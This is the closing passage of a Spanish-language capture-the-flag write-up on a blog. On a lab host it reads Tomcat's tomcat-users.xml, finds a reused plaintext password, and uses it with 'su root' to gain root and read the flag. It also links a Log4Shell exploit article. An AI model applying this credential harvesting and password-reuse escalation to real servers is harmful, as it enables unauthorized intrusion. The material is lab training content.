+-rw-r----- 1 root tomcat   7276 Dec  2  2021 catalina.properties
+-rw-r----- 1 root tomcat   1400 Dec  2  2021 context.xml
+-rw-r----- 1 root tomcat   1149 Dec  2  2021 jaspic-providers.xml
+-rw-r----- 1 root tomcat   2313 Dec  2  2021 jaspic-providers.xsd
+-rw-r----- 1 root tomcat   4144 Dec  2  2021 logging.properties
+-rw-r----- 1 root tomcat   7580 Dec  2  2021 server.xml
+-rw-r----- 1 root tomcat   1226 Dec 11  2021 tomcat-users.xml
+-rw-r----- 1 root tomcat   2558 Dec  2  2021 tomcat-users.xsd
+-rw-r----- 1 root tomcat 172359 Dec  2  2021 web.xml
+tomcat@ip-10-10-10-7:~/conf$
+</code></pre></div></div>
+<ul>
+<li>Vemos las credenciales.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">tomcat@ip-10-10-10-7:~/conf$ cat tomcat-users.xml
+cat tomcat-users.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the &quot;License&quot;); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+--&gt;
+&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;
+              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;
+              version=&quot;1.0&quot;&gt;
+  &lt;user username=&quot;admin&quot; password=&quot;H2RR3rGDrbAnPxWa&quot; roles=&quot;manager-gui&quot;/&gt;
+  &lt;user username=&quot;robot&quot; password=&quot;H2RR3rGDrbAnPxWa&quot; roles=&quot;manager-script&quot;/&gt;
+
+&lt;/tomcat-users&gt;
+tomcat@ip-10-10-10-7:~/conf$
+</code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<ul>
+<li>Si las probamos, vemos que prácticamente es la contraseña del usuario <strong>root</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">tomcat@ip-10-10-10-7:~/conf$ su root
+su root
+Password: H2RR3rGDrbAnPxWa
+
+root@ip-10-10-10-7:/opt/tomcat/conf# whoami
+whoami
+root
+root@ip-10-10-10-7:/opt/tomcat/conf#
+</code></pre></div></div>
+<ul>
+<li>Y allí podemos ver la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@ip-10-10-10-7:~# cat root.txt
+cat root.txt
+VL{xd}
+</code></pre></div></div>
+<h2 id="extra-info">Extra info</h2>
+<ul>
+<li><a href="https://www.hackplayers.com/2021/12/ce-en-log4j-log4shell-simple-exploit.html">https://www.hackplayers.com/2021/12/ce-en-log4j-log4shell-simple-exploit.html</a></li>
+</ul>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/gfsxmz3ATBE" frameborder="0" allowfullscreen></iframe>
+
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
